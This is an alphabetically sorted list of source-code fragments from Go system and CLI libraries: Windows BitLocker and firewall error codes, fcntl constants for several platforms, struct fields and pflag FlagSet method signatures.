FVE_E_POLICY_STARTUP_TPM_REQUIRED                                         Handle        = 0x80310067
FVE_E_POLICY_USER_CERTIFICATE_NOT_ALLOWED                                 Handle        = 0x80310072
FVE_E_POLICY_USER_CERTIFICATE_REQUIRED                                    Handle        = 0x80310073
FVE_E_POLICY_USER_CERT_MUST_BE_HW                                         Handle        = 0x80310074
FVE_E_POLICY_USER_CONFIGURE_FDV_AUTOUNLOCK_NOT_ALLOWED                    Handle        = 0x80310075
FVE_E_POLICY_USER_CONFIGURE_RDV_AUTOUNLOCK_NOT_ALLOWED                    Handle        = 0x80310076
FVE_E_POLICY_USER_CONFIGURE_RDV_NOT_ALLOWED                               Handle        = 0x80310077
FVE_E_POLICY_USER_DISABLE_RDV_NOT_ALLOWED                                 Handle        = 0x80310079
FVE_E_POLICY_USER_ENABLE_RDV_NOT_ALLOWED                                  Handle        = 0x80310078
FVE_E_PRIVATEKEY_AUTH_FAILED                                              Handle        = 0x80310094
FVE_E_PROTECTION_CANNOT_BE_DISABLED                                       Handle        = 0x803100D8
FVE_E_PROTECTION_DISABLED                                                 Handle        = 0x80310021
FVE_E_PROTECTOR_CHANGE_MAX_PASSPHRASE_CHANGE_ATTEMPTS_REACHED             Handle        = 0x803100C0
FVE_E_PROTECTOR_CHANGE_MAX_PIN_CHANGE_ATTEMPTS_REACHED                    Handle        = 0x803100A3
FVE_E_PROTECTOR_CHANGE_PASSPHRASE_MISMATCH                                Handle        = 0x803100A9
FVE_E_PROTECTOR_CHANGE_PIN_MISMATCH                                       Handle        = 0x803100A1
FVE_E_PROTECTOR_EXISTS                                                    Handle        = 0x80310031
FVE_E_PROTECTOR_NOT_FOUND                                                 Handle        = 0x80310033
FVE_E_PUBKEY_NOT_ALLOWED                                                  Handle        = 0x80310058
FVE_E_RAW_ACCESS                                                          Handle        = 0x80310050
FVE_E_RAW_BLOCKED                                                         Handle        = 0x80310051
FVE_E_REBOOT_REQUIRED                                                     Handle        = 0x8031004E
FVE_E_RECOVERY_KEY_REQUIRED                                               Handle        = 0x80310022
FVE_E_RECOVERY_PARTITION                                                  Handle        = 0x80310082
FVE_E_RELATIVE_PATH                                                       Handle        = 0x80310032
FVE_E_REMOVAL_OF_DRA_FAILED                                               Handle        = 0x80310095
FVE_E_REMOVAL_OF_NKP_FAILED                                               Handle        = 0x8031009E
FVE_E_SECUREBOOT_CONFIGURATION_INVALID                                    Handle        = 0x803100BB
FVE_E_SECUREBOOT_DISABLED                                                 Handle        = 0x803100BA
FVE_E_SECURE_KEY_REQUIRED                                                 Handle        = 0x80310007
FVE_E_SHADOW_COPY_PRESENT                                                 Handle        = 0x803100BD
FVE_E_SYSTEM_VOLUME                                                       Handle        = 0x80310012
FVE_E_TOKEN_NOT_IMPERSONATED                                              Handle        = 0x8031004C
FVE_E_TOO_SMALL                                                           Handle        = 0x80310011
FVE_E_TPM_DISABLED                                                        Handle        = 0x8031003F
FVE_E_TPM_INVALID_PCR                                                     Handle        = 0x80310041
FVE_E_TPM_NOT_OWNED                                                       Handle        = 0x80310018
FVE_E_TPM_NO_VMK                                                          Handle        = 0x80310042
FVE_E_TPM_SRK_AUTH_NOT_ZERO                                               Handle        = 0x80310025
FVE_E_TRANSIENT_STATE                                                     Handle        = 0x80310057
FVE_E_VIRTUALIZED_SPACE_TOO_BIG                                           Handle        = 0x80310089
FVE_E_VOLUME_BOUND_ALREADY                                                Handle        = 0x8031001F
FVE_E_VOLUME_EXTEND_PREVENTS_EOW_DECRYPT                                  Handle        = 0x803100D6
FVE_E_VOLUME_HANDLE_OPEN                                                  Handle        = 0x80310059
FVE_E_VOLUME_NOT_BOUND                                                    Handle        = 0x80310017
FVE_E_VOLUME_TOO_SMALL                                                    Handle        = 0x8031006F
FVE_E_WIPE_CANCEL_NOT_APPLICABLE                                          Handle        = 0x803100B9
FVE_E_WIPE_NOT_ALLOWED_ON_TP_STORAGE                                      Handle        = 0x803100A6
FVE_E_WRONG_BOOTMGR                                                       Handle        = 0x80310006
FVE_E_WRONG_BOOTSECTOR                                                    Handle        = 0x8031002A
FVE_E_WRONG_SYSTEM_FS                                                     Handle        = 0x8031002B
FWP_E_ACTION_INCOMPATIBLE_WITH_LAYER                                      Handle        = 0x8032002C
FWP_E_ACTION_INCOMPATIBLE_WITH_SUBLAYER                                   Handle        = 0x8032002D
FWP_E_ALREADY_EXISTS                                                      Handle        = 0x80320009
FWP_E_BUILTIN_OBJECT                                                      Handle        = 0x80320017
FWP_E_CALLOUT_NOTIFICATION_FAILED                                         Handle        = 0x80320037
FWP_E_CALLOUT_NOT_FOUND                                                   Handle        = 0x80320001
FWP_E_CONDITION_NOT_FOUND                                                 Handle        = 0x80320002
FWP_E_CONNECTIONS_DISABLED                                                Handle        = 0x80320041
FWP_E_CONTEXT_INCOMPATIBLE_WITH_CALLOUT                                   Handle        = 0x8032002F
FWP_E_CONTEXT_INCOMPATIBLE_WITH_LAYER                                     Handle        = 0x8032002E
FWP_E_DROP_NOICMP                                                         Handle        = 0x80320104
FWP_E_DUPLICATE_AUTH_METHOD                                               Handle        = 0x8032003C
FWP_E_DUPLICATE_CONDITION                                                 Handle        = 0x8032002A
FWP_E_DUPLICATE_KEYMOD                                                    Handle        = 0x8032002B
FWP_E_DYNAMIC_SESSION_IN_PROGRESS                                         Handle        = 0x8032000B
FWP_E_EM_NOT_SUPPORTED                                                    Handle        = 0x80320032
FWP_E_FILTER_NOT_FOUND                                                    Handle        = 0x80320003
FWP_E_IKEEXT_NOT_RUNNING                                                  Handle        = 0x80320044
FWP_E_INCOMPATIBLE_AUTH_METHOD                                            Handle        = 0x80320030
FWP_E_INCOMPATIBLE_CIPHER_TRANSFORM                                       Handle        = 0x8032003A
FWP_E_INCOMPATIBLE_DH_GROUP                                               Handle        = 0x80320031
FWP_E_INCOMPATIBLE_LAYER                                                  Handle        = 0x80320014
FWP_E_INCOMPATIBLE_SA_STATE                                               Handle        = 0x8032001B
FWP_E_INCOMPATIBLE_TXN                                                    Handle        = 0x80320011
FWP_E_INVALID_ACTION_TYPE                                                 Handle        = 0x80320024
FWP_E_INVALID_AUTH_TRANSFORM                                              Handle        = 0x80320038
FWP_E_INVALID_CIPHER_TRANSFORM                                            Handle        = 0x80320039
FWP_E_INVALID_DNS_NAME                                                    Handle        = 0x80320042
FWP_E_INVALID_ENUMERATOR                                                  Handle        = 0x8032001D
FWP_E_INVALID_FLAGS                                                       Handle        = 0x8032001E
FWP_E_INVALID_INTERVAL                                                    Handle        = 0x80320021
FWP_E_INVALID_NET_MASK                                                    Handle        = 0x8032001F
FWP_E_INVALID_PARAMETER                                                   Handle        = 0x80320035
FWP_E_INVALID_RANGE                                                       Handle        = 0x80320020
FWP_E_INVALID_TRANSFORM_COMBINATION                                       Handle        = 0x8032003B
FWP_E_INVALID_TUNNEL_ENDPOINT                                             Handle        = 0x8032003D
FWP_E_INVALID_WEIGHT                                                      Handle        = 0x80320025
FWP_E_IN_USE                                                              Handle        = 0x8032000A
FWP_E_KEY_DICTATION_INVALID_KEYING_MATERIAL                               Handle        = 0x80320040
FWP_E_KEY_DICTATOR_ALREADY_REGISTERED                                     Handle        = 0x8032003F
FWP_E_KM_CLIENTS_ONLY                                                     Handle        = 0x80320015
FWP_E_L2_DRIVER_NOT_READY                                                 Handle        = 0x8032003E
FWP_E_LAYER_NOT_FOUND                                                     Handle        = 0x80320004
FWP_E_LIFETIME_MISMATCH                                                   Handle        = 0x80320016
FWP_E_MATCH_TYPE_MISMATCH                                                 Handle        = 0x80320026
FWP_E_NET_EVENTS_DISABLED                                                 Handle        = 0x80320013
FWP_E_NEVER_MATCH                                                         Handle        = 0x80320033
FWP_E_NOTIFICATION_DROPPED                                                Handle        = 0x80320019
FWP_E_NOT_FOUND                                                           Handle        = 0x80320008
FWP_E_NO_TXN_IN_PROGRESS                                                  Handle        = 0x8032000D
FWP_E_NULL_DISPLAY_NAME                                                   Handle        = 0x80320023
FWP_E_NULL_POINTER                                                        Handle        = 0x8032001C
FWP_E_OUT_OF_BOUNDS                                                       Handle        = 0x80320028
FWP_E_PROVIDER_CONTEXT_MISMATCH                                           Handle        = 0x80320034
FWP_E_PROVIDER_CONTEXT_NOT_FOUND                                          Handle        = 0x80320006
FWP_E_PROVIDER_NOT_FOUND                                                  Handle        = 0x80320005
FWP_E_RESERVED                                                            Handle        = 0x80320029
FWP_E_SESSION_ABORTED                                                     Handle        = 0x80320010
FWP_E_STILL_ON                                                            Handle        = 0x80320043
FWP_E_SUBLAYER_NOT_FOUND                                                  Handle        = 0x80320007
FWP_E_TIMEOUT                                                             Handle        = 0x80320012
FWP_E_TOO_MANY_CALLOUTS                                                   Handle        = 0x80320018
FWP_E_TOO_MANY_SUBLAYERS                                                  Handle        = 0x80320036
FWP_E_TRAFFIC_MISMATCH                                                    Handle        = 0x8032001A
FWP_E_TXN_ABORTED                                                         Handle        = 0x8032000F
FWP_E_TXN_IN_PROGRESS                                                     Handle        = 0x8032000E
FWP_E_TYPE_MISMATCH                                                       Handle        = 0x80320027
FWP_E_WRONG_SESSION                                                       Handle        = 0x8032000C
FWP_E_ZERO_LENGTH_ARRAY                                                   Handle        = 0x80320022
F_ADDFILESIGS                           = 0x3d
F_ADDFILESIGS_FOR_DYLD_SIM              = 0x53
F_ADDFILESIGS_INFO                      = 0x67
F_ADDFILESIGS_RETURN                    = 0x61
F_ADDFILESUPPL                          = 0x68
F_ADDSIGS                               = 0x3b
F_ADD_SEALS                                 = 0x409
F_ALLOCATEALL                           = 0x4
F_ALLOCATECONTIG                        = 0x2
F_ALLOCSP                     = 0xa
F_ALLOCSP64                   = 0xa
F_BADFD                       = 0x2e
F_BARRIERFSYNC                          = 0x55
F_BLKSIZE                     = 0x13
F_BLOCKS                      = 0x12
F_CANCEL                       = 0x5
F_CHECK_LV                              = 0x62
F_CHKCLEAN                              = 0x29
F_CHKFL                       = 0x8
F_CLOSEM                          = 0xa
F_CLOSEM                      = 0xa
F_CLOSFD                        = 9
F_COMPAT                      = 0x8
F_CONTROL_CVT                   = 13
F_DUP2FD                          = 0xa
F_DUP2FD                       = 0xa
F_DUP2FD                      = 0x9
F_DUP2FD                      = 0xe
F_DUP2FD_CLOEXEC                  = 0x12
F_DUP2FD_CLOEXEC               = 0x12
F_DUP2FD_CLOEXEC              = 0x24
F_DUPFD                                     = 0x0
F_DUPFD                                 = 0x0
F_DUPFD                           = 0x0
F_DUPFD                         = 0
F_DUPFD                        = 0x0
F_DUPFD                       = 0x0
F_DUPFD2                        = 8
F_DUPFD_CLOEXEC                             = 0x406
F_DUPFD_CLOEXEC                         = 0x43
F_DUPFD_CLOEXEC                   = 0x11
F_DUPFD_CLOEXEC                   = 0xa
F_DUPFD_CLOEXEC                   = 0xc
F_DUPFD_CLOEXEC                = 0x11
F_DUPFD_CLOEXEC               = 0x25
F_EXLCK                                     = 0x4
F_FINDSIGS                              = 0x4e
F_FLOCK                       = 0x35
F_FLOCK64                     = 0x35
F_FLOCKW                      = 0x36
F_FLOCKW64                    = 0x36
F_FLUSH_DATA                            = 0x28
F_FREESP                      = 0xb
F_FREESP64                    = 0xb
F_FREEZE_FS                             = 0x35
F_FSCTL                           = -0x80000000
F_FSDIRMASK                       = 0x70000000
F_FSIN                            = 0x10000000
F_FSINOUT                         = 0x30000000
F_FSOUT                           = 0x20000000
F_FSPRIV                          = 0x8000
F_FSVOID                          = 0x40000000
F_FULLFSYNC                             = 0x33
F_GETCODEDIR                            = 0x48
F_GETFD                                     = 0x1
F_GETFD                                 = 0x1
F_GETFD                           = 0x1
F_GETFD                         = 1
F_GETFD                        = 0x1
F_GETFD                       = 0x1
F_GETFL                                     = 0x3
F_GETFL                                 = 0x3
F_GETFL                           = 0x3
F_GETFL                         = 259
F_GETFL                        = 0x3
F_GETFL                       = 0x3
F_GETLEASE                                  = 0x401
F_GETLK                                 = 0x7
F_GETLK                           = 0x7
F_GETLK                          = 0x21
F_GETLK                          = 0x5
F_GETLK                          = 0x7
F_GETLK                          = 0xc
F_GETLK                          = 0xe
F_GETLK                         = 5
F_GETLK                        = 0xb
F_GETLK                       = 0x5
F_GETLK                       = 0xb
F_GETLK                       = 0xe
F_GETLK64                        = 0x21
F_GETLK64                        = 0x5
F_GETLK64                        = 0x7
F_GETLK64                        = 0xc
F_GETLK64                        = 0xe
F_GETLK64                     = 0xb
F_GETLK64                     = 0xe
F_GETLKPID                              = 0x42
F_GETNOSIGPIPE                          = 0x4a
F_GETNOSIGPIPE                    = 0xd
F_GETOWN                                = 0x5
F_GETOWN                          = 0x5
F_GETOWN                         = 0x17
F_GETOWN                         = 0x5
F_GETOWN                         = 0x9
F_GETOWN                        = 10
F_GETOWN                       = 0x5
F_GETOWN                      = 0x17
F_GETOWN                      = 0x8
F_GETOWN_EX                                 = 0x10
F_GETPATH                               = 0x32
F_GETPATH_MTMINFO                       = 0x47
F_GETPATH_NOFIRMLINK                    = 0x66
F_GETPIPE_SZ                                = 0x408
F_GETPROTECTIONCLASS                    = 0x3f
F_GETPROTECTIONLEVEL                    = 0x4d
F_GETSIG                                    = 0xb
F_GETSIGSINFO                           = 0x69
F_GETXFL                      = 0x2d
F_GET_FILE_RW_HINT                          = 0x40d
F_GET_RW_HINT                               = 0x40b
F_GET_SEALS                                 = 0x40a
F_GLOBAL_NOCACHE                        = 0x37
F_HASREMOTELOCKS              = 0x1a
F_ISATTY                          = 0xb
F_ISSTREAM                    = 0xd
F_LOCK                                      = 0x1
F_LOCK                        = 0x1
F_LOG2PHYS                              = 0x31
F_LOG2PHYS_EXT                          = 0x41
F_MANDDNY                     = 0x10
F_MAXFD                           = 0xb
F_MDACC                       = 0x20
F_NOCACHE                               = 0x30
F_NODIRECT                              = 0x3e
F_NODNY                       = 0x0
F_NOTIFY                                    = 0x402
F_NPRIV                       = 0x10
F_OFD_GETLK                                 = 0x24
F_OFD_GETLK                   = 0x2f
F_OFD_GETLK64                 = 0x2f
F_OFD_SETLK                                 = 0x25
F_OFD_SETLK                   = 0x30
F_OFD_SETLK64                 = 0x30
F_OFD_SETLKW                                = 0x26
F_OFD_SETLKW                  = 0x31
F_OFD_SETLKW64                = 0x31
F_OGETLK                       = 0x7
F_OK                                        = 0x0
F_OK                                    = 0x0
F_OK                              = 0x0
F_OK                            = 0x0
F_OK                           = 0x0
F_OK                          = 0x0
F_OSETLK                       = 0x8
F_OSETLKW                      = 0x9
F_PARAM_MASK                      = 0xfff
F_PARAM_MAX                       = 0xfff
F_PATHPKG_CHECK                         = 0x34
F_PEOFPOSMODE                           = 0x3
F_PREALLOCATE                           = 0x2a
F_PRIV                        = 0xf
F_PUNCHHOLE                             = 0x63
F_QUOTACTL                    = 0x11
F_RDACC                       = 0x1
F_RDADVISE                              = 0x2c
F_RDAHEAD                               = 0x2d
F_RDAHEAD                      = 0x10
F_RDDNY                       = 0x1
F_RDLCK                                 = 0x1
F_RDLCK                           = 0x1
F_RDLCK                          = 0x0
F_RDLCK                          = 0x1
F_RDLCK                         = 1
F_RDLCK                        = 0x1
F_RDLCK                       = 0x1
F_READAHEAD                    = 0xf
F_REVOKE                      = 0x19
F_RMACC                       = 0x4
F_RMDNY                       = 0x4
F_RWACC                       = 0x3
F_RWDNY                       = 0x3
F_SEAL_FUTURE_WRITE                         = 0x10
F_SEAL_GROW                                 = 0x4
F_SEAL_SEAL                                 = 0x1
F_SEAL_SHRINK                               = 0x2
F_SEAL_WRITE                                = 0x8
F_SETBACKINGSTORE                       = 0x46
F_SETFD                                     = 0x2
F_SETFD                                 = 0x2
F_SETFD                           = 0x2
F_SETFD                         = 2
F_SETFD                        = 0x2
F_SETFD                       = 0x2
F_SETFL                                     = 0x4
F_SETFL                                 = 0x4
F_SETFL                           = 0x4
F_SETFL                         = 4
F_SETFL                        = 0x4
F_SETFL                       = 0x4
F_SETLEASE                                  = 0x400
F_SETLK                                 = 0x8
F_SETLK                           = 0x8
F_SETLK                          = 0x22
F_SETLK                          = 0x6
F_SETLK                          = 0x8
F_SETLK                          = 0xd
F_SETLK                         = 6
F_SETLK                        = 0xc
F_SETLK                       = 0x6
F_SETLK                       = 0xc
F_SETLK64                        = 0x22
F_SETLK64                        = 0x6
F_SETLK64                        = 0x8
F_SETLK64                        = 0xd
F_SETLK64                     = 0x6
F_SETLK64                     = 0xc
F_SETLK64_NBMAND              = 0x2a
F_SETLKW                                = 0x9
F_SETLKW                          = 0x9
F_SETLKW                         = 0x23
F_SETLKW                         = 0x7
F_SETLKW                         = 0x9
F_SETLKW                         = 0xe
F_SETLKW                        = 7
F_SETLKW                       = 0xd
F_SETLKW                      = 0x7
F_SETLKW                      = 0xd
F_SETLKW64                       = 0x23
F_SETLKW64                       = 0x7
F_SETLKW64                       = 0x9
F_SETLKW64                       = 0xe
F_SETLKW64                    = 0x7
F_SETLKW64                    = 0xd
F_SETLKWTIMEOUT                         = 0xa
F_SETLK_NBMAND                = 0x2a
F_SETLK_REMOTE                 = 0xe
F_SETNOSIGPIPE                          = 0x49
F_SETNOSIGPIPE                    = 0xe
F_SETOWN                                = 0x6
F_SETOWN                          = 0x6
F_SETOWN                         = 0x18
F_SETOWN                         = 0x6
F_SETOWN                         = 0x8
F_SETOWN                        = 11
F_SETOWN                       = 0x6
F_SETOWN                      = 0x18
F_SETOWN                      = 0x9
F_SETOWN_EX                                 = 0xf
F_SETPIPE_SZ                                = 0x407
F_SETPROTECTIONCLASS                    = 0x40
F_SETSIG                                    = 0xa
F_SETSIZE                               = 0x2b
F_SETTAG                        = 12
F_SET_FILE_RW_HINT                          = 0x40e
F_SET_RW_HINT                               = 0x40c
F_SHARE                       = 0x28
F_SHARE_NBMAND                = 0x2b
F_SHLCK                                     = 0x8
F_SINGLE_WRITER                         = 0x4c
F_SPECULATIVE_READ                      = 0x65
F_TEST                                      = 0x3
F_TEST                        = 0x3
F_THAW_FS                               = 0x36
F_TLOCK                                     = 0x2
F_TLOCK                       = 0x2
F_TRANSCODEKEY                          = 0x4b
F_TRIM_ACTIVE_FILE                      = 0x64
F_TSTLK                       = 0xf
F_ULOCK                                     = 0x0
F_ULOCK                       = 0x0
F_UNLCK                                 = 0x2
F_UNLCK                           = 0x2
F_UNLCK                          = 0x2
F_UNLCK                          = 0x3
F_UNLCK                         = 3
F_UNLCK                        = 0x2
F_UNLCK                       = 0x3
F_UNLCKSYS                     = 0x4
F_UNLKSYS                     = 0x4
F_UNSHARE                     = 0x29
F_VOLPOSMODE                            = 0x4
F_WRACC                       = 0x2
F_WRDNY                       = 0x2
F_WRLCK                                 = 0x3
F_WRLCK                           = 0x3
F_WRLCK                          = 0x1
F_WRLCK                          = 0x2
F_WRLCK                         = 2
F_WRLCK                        = 0x3
F_WRLCK                       = 0x2
F_asyncreads  uint64
F_asyncwrites uint64
F_bavail      int64
F_bfree       uint64
F_blocks      uint64
F_bsize       uint32
F_ctime       uint64
F_favail      int64
F_ffree       uint64
F_files       uint64
F_flags       uint32
F_fsid        Fsid
F_fstypename  [16]byte
F_iosize      uint32
F_mntfromname [90]byte
F_mntfromspec [90]byte
F_mntonname   [90]byte
F_namemax     uint32
F_owner       uint32
F_syncreads   uint64
F_syncwrites  uint64
Fabiano Franz <ffranz@redhat.com>                   <contact@fabianofranz.com>
Fackets        uint32
Failed    uint32
Family         uint16
Family      uint16
Family    int32
Family    uint16
Family    uint8
Family   uint16
Family   uint8
Family  uint16
Family  uint8
Family uint16
Family uint8
Faults             int32
Favail      uint32
Favail      uint64
Favail   uint64
Fchdir(fd int) (err error)
Fd           int32
Fd        int32
Fd       int32
Fd      int32
Fd     int32
Fd     uintptr
Fd int32
FdSet) Clear(fd int) {
FdSet) IsSet(fd int) bool {
FdSet) Set(fd int) {
FdSet) Zero() {
Fdatasync(fd int) (err error)
Feat   uint32
Feature uint32
Feature uint8
Feature_req_word uint32
Fflags    uint32
Fflags uint32
Ffree       int64
Ffree       uint32
Ffree       uint64
Ffree     uint32
Ffree     uint64
Ffree    uint64
Ffree   uint32
Ffree   uint64
Fid       [8]byte
Field_valid    uint16
File         Handle
File completion by default
File completion for all arguments by default
FileAlignmentInfo              = 17
FileAllocationInfo             = 5
FileAttributeTagInfo           = 9
FileAttributes     uint32
FileAttributes    uint32
FileAttributes uint32
FileBasicInfo                  = 0
FileBasicInformation                         = 4
FileCaseSensitiveInfo          = 23
FileCaseSensitiveInformation                 = 71
FileCaseSensitiveInformationForceAccessCheck = 75
FileCloneRange) error {
FileCompressionInfo            = 8
FileDateLS       uint32
FileDateMS       uint32
FileDedupeRange) error {
FileDispositionInfo            = 4
FileDispositionInfoEx          = 21
FileDispositionInformation                   = 13
FileDispositionInformationEx                 = 64
FileEndOfFileInfo              = 6
FileEndOfFileInformation                     = 20
FileFlags        uint32
FileFlagsMask    uint32
FileFullDirectoryInfo          = 14
FileFullDirectoryRestartInfo   = 15
FileHandle) Bytes() []byte {
FileHandle) Size() int   { return int(fh.fileHandle.Bytes) }
FileHandle) Type() int32 { return fh.fileHandle.Type }
FileIdBothDirectoryInfo        = 10
FileIdBothDirectoryRestartInfo = 11
FileIdExtdDirectoryInfo        = 19
FileIdExtdDirectoryRestartInfo = 20
FileIdInfo                     = 18
FileIndexHigh      uint32
FileIndexLow       uint32
FileIoPriorityHintInfo         = 12
FileIoPriorityHintInformation                = 43
FileKnownFolderInformation                   = 76
FileLinkInformation                          = 72
FileName          [MAX_PATH - 1]uint16
FileName          [MAX_PATH]uint16
FileName        uint16
FileNameInfo                   = 2
FileNameLength  uint32
FileNormalizedNameInfo         = 24
FileOS           uint32
FileOrCatalogOrBlobOrSgnrOrCert unsafe.Pointer
FilePath     
FilePositionInformation                      = 14
FileQueue                HSPFILEQ
FileRemoteProtocolInfo         = 13
FileRenameInfo                 = 3
FileRenameInfoEx               = 22
FileRenameInformation                        = 10
FileReplaceCompletionInformation             = 61
FileShortNameInformation                     = 40
FileSizeHigh       uint32
FileSizeHigh      uint32
FileSizeHigh   uint32
FileSizeLow        uint32
FileSizeLow       uint32
FileSizeLow    uint32
FileStandardInfo               = 1
FileStorageInfo                = 16
FileStreamInfo                 = 7
FileSubtype      uint32
FileType         uint32
FileValidDataLengthInformation               = 39
FileVersionLS    uint32
FileVersionMS    uint32
File_name        [64]uint8
File_tag     struct {
Filefmt   byte
Filenames_encryption_mode uint8
Fileno       uint64
Fileno    uint64
Fileno  uint64
Fileno uint32
Fileno uint64
Files       int64
Files       uint32
Files       uint64
Files     uint32
Files     uint64
Files    uint64
Files   uint32
Files   uint64
Files: []
Filetime
Filetime)
Filetime) (err error)
Filetime) (err error) {
Filetime) (regerrno error) = advapi32.RegEnumKeyExW
Filetime) (regerrno error) = advapi32.RegQueryInfoKeyW
Filetime) (regerrno error) {
Filetime) Nanoseconds() int64 {
Filetime) {
FillAttribute uint32
Filler   [3]uint32
Filler   [3]uint64
Filt [8]uint32
Filter 
Filter    uint32
Filter  uint32
Filter int16
Filter uint32
Find more information at https://github.com/GoogleCloudPlatform/kubernetes.
FindArg                Pointer
FindCallback           Pointer
FindClose(handle Handle) (err error)
FindCloseChangeNotification(handle Handle) (err error)
FindFirstVolume(volumeName 
FindFirstVolumeMountPoint(rootPathName 
FindNextChangeNotification(handle Handle) (err error)
FindVolumeClose(findVolume Handle) (err error)
FindVolumeMountPointClose(findVolumeMountPoint Handle) (err error)
FirstAnycastAddress   
FirstDnsServerAddress 
FirstMulticastAddress 
FirstPrefix           
FirstUnicastAddress   
Flag
Flag        uint32
Flag        uint64
Flag     uint16
Flag     uint64
Flag    int32
Flag functionality is provided by the [pflag
Flag names are only completed if the user has typed the first 
Flag {
Flag)
Flag) []
Flag) defaultIsZeroValue() bool {
Flag) {
Flag)) {
Flag-value completion
FlagSet {
FlagSet) AddFlag(flag 
FlagSet) AddFlagSet(newSet 
FlagSet) AddGoFlag(goflag 
FlagSet) AddGoFlagSet(newSet 
FlagSet) Arg(i int) string {
FlagSet) Args() []string { return f.args }
FlagSet) ArgsLenAtDash() int {
FlagSet) BoolSliceVar(p 
FlagSet) BoolSliceVarP(p 
FlagSet) BoolVar(p 
FlagSet) BoolVarP(p 
FlagSet) BytesBase64Var(p 
FlagSet) BytesBase64VarP(p 
FlagSet) BytesHexVar(p 
FlagSet) BytesHexVarP(p 
FlagSet) Changed(name string) bool {
FlagSet) CountVar(p 
FlagSet) CountVarP(p 
FlagSet) DurationSliceVar(p 
FlagSet) DurationSliceVarP(p 
FlagSet) DurationVar(p 
FlagSet) DurationVarP(p 
FlagSet) FlagUsages() string {
FlagSet) FlagUsagesWrapped(cols int) string {
FlagSet) Float32SliceVar(p 
FlagSet) Float32SliceVarP(p 
FlagSet) Float32Var(p 
FlagSet) Float32VarP(p 
FlagSet) Float64SliceVar(p 
FlagSet) Float64SliceVarP(p 
FlagSet) Float64Var(p 
FlagSet) Float64VarP(p 
FlagSet) GetNormalizeFunc() func(f 
FlagSet) HasAvailableFlags() bool {
FlagSet) HasFlags() bool {
FlagSet) IPMaskVar(p 
FlagSet) IPMaskVarP(p 
FlagSet) IPNetVar(p 
FlagSet) IPNetVarP(p 
FlagSet) IPSliceVar(p 
FlagSet) IPSliceVarP(p 
FlagSet) IPVar(p 
FlagSet) IPVarP(p 
FlagSet) Int16Var(p 
FlagSet) Int16VarP(p 
FlagSet) Int32SliceVar(p 
FlagSet) Int32SliceVarP(p 
FlagSet) Int32Var(p 
FlagSet) Int32VarP(p 
FlagSet) Int64SliceVar(p 
FlagSet) Int64SliceVarP(p 
FlagSet) Int64Var(p 
FlagSet) Int64VarP(p 
FlagSet) Int8Var(p 
FlagSet) Int8VarP(p 
FlagSet) IntSliceVar(p 
FlagSet) IntSliceVarP(p 
FlagSet) IntVar(p 
FlagSet) IntVarP(p 
FlagSet) Lookup(name string) 
FlagSet) MarkHidden(name string) error {
FlagSet) NArg() int { return len(f.args) }
FlagSet) NFlag() int { return len(f.actual) }
FlagSet) Parse(arguments []string) error {
FlagSet) Parsed() bool {
FlagSet) PrintDefaults() {
FlagSet) SetInterspersed(interspersed bool) {
FlagSet) SetNormalizeFunc(n func(f 
FlagSet) SetOutput(output io.Writer) {
FlagSet) ShorthandLookup(name string) 
FlagSet) StringArrayVar(p 
FlagSet) StringArrayVarP(p 
FlagSet) StringSliceVar(p 
FlagSet) StringSliceVarP(p 
FlagSet) StringToInt64Var(p 
FlagSet) StringToInt64VarP(p 
FlagSet) StringToIntVar(p 
FlagSet) StringToIntVarP(p 
FlagSet) StringToStringVar(p 
FlagSet) StringToStringVarP(p 
FlagSet) StringVar(p 
FlagSet) StringVarP(p 
FlagSet) Uint16Var(p 
FlagSet) Uint16VarP(p 
FlagSet) Uint32Var(p 
FlagSet) Uint32VarP(p 
FlagSet) Uint64Var(p 
FlagSet) Uint64VarP(p 
FlagSet) Uint8Var(p 
FlagSet) Uint8VarP(p 
FlagSet) UintSliceVar(p 
FlagSet) UintSliceVarP(p 
FlagSet) UintVar(p 
FlagSet) UintVarP(p 
FlagSet) Visit(fn func(
FlagSet) VisitAll(fn func(
FlagSet) lookup(name NormalizedName) 
FlagSet) normalizeFlagName(name string) NormalizedName {
FlagSet) out() io.Writer {
FlagSet) usage() {
FlagSet) {
FlagSet{
Flags
Flags                     uint8
Flags                    DI_FLAGS
Flags                 uint32
Flags                uint32
Flags               uint32
Flags              uint32
Flags             uint32
Flags            int32
Flags            uint32
Flags           uint32
Flags          uint16
Flags          uint32
Flags         uint32
Flags        int32
Flags        uint16
Flags        uint32
Flags       int32
Flags       uint32
Flags       uint64
Flags      int32
Flags      uint32
Flags     int32
Flags     uint16
Flags     uint32
Flags     uint8
Flags    int32
Flags    uint32
Flags    uint64
Flags   int32
Flags   int64
Flags   uint32
Flags   uint64
Flags   uint8
Flags  uint16
Flags  uint32
Flags are optional by default. If instead you wish your command to report an error
Flags int16
Flags provide modifiers to control how the action command operates.
Flags uint16
Flags uint32
Flags uint8
Flags:
FlagsEx                  DI_FLAGSEX
Flags_ext   uint32
Flag{
Flink 
Flock_t) (err error) = fcntl
Flock_t) (err error) {
Flock_t) error {
Flowinfo uint32
Flt_acow           int32
Flt_anon           int32
Flt_obj            int32
Flt_prcopy         int32
Flt_przero         int32
Fltamcopy          int32
Fltanget           int32
Fltanretry         int32
Fltget             int32
Fltlget            int32
Fltnamap           int32
Fltnoamap          int32
Fltnoanon          int32
Fltnomap           int32
Fltnoram           int32
Fltpgrele          int32
Fltpgwait          int32
Fltrelck           int32
Fltrelckok         int32
FlushFileBuffers(handle Handle) (err error)
Fmask    int32
Fmask   int32
FmtID DEVPROPGUID
Fname     [32]uint8
Fname  [6]int8
Fname  [6]uint8
For example cmd/root.go:
For example:
For go1.18:
For many years people have printed back to the screen.
Forks              int32
Forks_ppwait       int32
Forks_sharevm      int32
FpReg) (err error) {
Fp_regs                  PtraceFpregs
Fpack     [32]uint8
Fpack  [6]int8
Fpack  [6]uint8
Fpc  uint32
Fpr      [8][3]uint32
Fpr_fpsr uint32
Fprs [16]float64
Fpswtch            int32
Fr XDPRingOffset
Frame_nr         uint32
Frame_nr   uint32
Frame_size       uint32
Frame_size uint32
Free               int32
FreeAddrInfoW(addrinfo 
FreeEnvironmentStrings(envs 
FreeLibrary(handle Handle) (err error)
FreeSid(sid 
Freehigh  uint32
Freehigh  uint64
Freemin            int32
Freepages_count           uint64
Freepages_delay_total     uint64
Freeram   uint32
Freeram   uint64
Freeswap  uint32
Freeswap  uint64
Freetarg           int32
Freeze_q_cnt uint32
Freq      int32
Freq      int64
Freq uint32
FreshnessTime    uint32
Fresvd      uint64
FriendlyName          
Frsize      uint32
Frsize      uint64
Frsize   uint64
Frsize  int32
Frsize  int64
Frsize  uint32
Frsize  uint64
Fs       uint64
Fs     uint16
Fs     uint32
Fs_base  uint64
